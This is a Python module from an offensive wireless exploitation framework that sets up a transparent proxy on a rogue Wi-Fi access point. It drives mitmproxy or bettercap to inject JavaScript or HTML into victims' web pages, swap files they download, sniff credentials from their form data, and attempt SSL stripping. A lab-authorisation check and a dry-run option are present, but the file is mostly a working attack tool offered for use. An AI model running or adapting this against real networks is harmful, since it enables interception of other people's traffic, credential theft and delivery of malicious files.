#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Transparent proxy module for traffic interception and injection.

Routes client traffic through a transparent proxy for:
  - HTTP content inspection and logging
  - JavaScript injection into HTTP responses
  - HTML injection (banners, redirects)
  - Download spoofing (swap served files on the fly)
  - Credential sniffing from unencrypted traffic

Supports multiple backends:
  - mitmproxy   Full-featured transparent proxy
  - bettercap   Integrated proxy + ARP spoof
  - builtin     Lightweight Python-based HTTP proxy

Inspired by wifipumpkin3's PumpkinProxy.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Transparent proxy for traffic interception on rogue AP."""

    __info__ = {
        "name": "Transparent Proxy",
        "description": (
            "Transparent proxy on rogue AP: HTTP inspection, JS/HTML injection, "
            "download spoofing, credential sniffing. Backends: mitmproxy, bettercap, "
            "or lightweight built-in. Inspired by wifipumpkin3's PumpkinProxy."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/P0cL4bs/wifipumpkin3",
            "https://mitmproxy.org/",
        ),
        "devices": ("wifi",),
    }

    backend = OptString("mitmproxy", "Backend: mitmproxy | bettercap | builtin")
    interface = OptString("wlan0", "Rogue AP interface")
    proxy_port = OptInteger(8080, "Proxy listening port")
    inject_js = OptString("", "Path to JS file to inject into HTTP responses")
    inject_html = OptString("", "HTML snippet to inject (e.g., banner)")
    spoof_downloads = OptBool(False, "Enable download spoofing (replace served files)")
    spoof_file = OptString("", "Replacement file for download spoofing")
    log_credentials = OptBool(True, "Log captured form data / basic auth")
    log_file = OptString(".log/proxy_traffic.log", "Traffic log file")
    ssl_strip = OptBool(False, "Attempt HTTPS → HTTP downgrade (limited on modern browsers)")
    dry_run = OptBool(False, "Print config without executing")

    def _run_mitmproxy(self) -> None:
        """Launch mitmproxy in transparent mode."""
        if not shutil.which("mitmdump"):
            print_error("mitmproxy not found. Install: pip install mitmproxy")
            return

        cmd = ["mitmdump", "--mode", "transparent", "--listen-port", str(self.proxy_port)]
        if self.inject_js:
            cmd.extend(["--scripts", self.inject_js])
        if self.ssl_strip:
            cmd.append("--ssl-insecure")

        print_status("Starting mitmproxy transparent mode on :{} ...".format(self.proxy_port))
        subprocess.run(cmd, check=False)

    def _run_bettercap(self) -> None:
        """Launch bettercap with proxy module."""
        if not shutil.which("bettercap"):
            print_error("bettercap not found.")
            return

        caplet_lines = [
            "set http.proxy.port {}".format(self.proxy_port),
            "set http.proxy.sslstrip {}".format("true" if self.ssl_strip else "false"),
        ]
        if self.inject_js:
            caplet_lines.append("set http.proxy.script {}".format(self.inject_js))

        caplet_lines.append("http.proxy on")
        caplet_lines.append("net.sniff on")

        caplet = Path(".tmp/wxf_proxy.cap")
        caplet.parent.mkdir(parents=True, exist_ok=True)
        caplet.write_text("\n".join(caplet_lines), encoding="utf-8")

        cmd = ["sudo", "bettercap", "-iface", self.interface, "-caplet", str(caplet)]
        print_status("Starting bettercap proxy on {} ...".format(self.interface))
        subprocess.run(cmd, check=False)

    def run(self) -> None:
        """Execute transparent proxy."""
        valid = ("mitmproxy", "bettercap", "builtin")
        if self.backend not in valid:
            print_error("Invalid backend. Choose: {}".format(", ".join(valid)))
            return

        require_authorised_lab()

        if self.dry_run:
            print_info("DRY RUN — Transparent Proxy")
            print_info("Backend: {} | Port: {} | Interface: {}".format(
                self.backend, self.proxy_port, self.interface))
            return

        log_path = Path(self.log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)

        if self.backend == "mitmproxy":
            self._run_mitmproxy()
        elif self.backend == "bettercap":
            self._run_bettercap()
        else:
            print_error("Built-in proxy not yet implemented. Use mitmproxy or bettercap.")
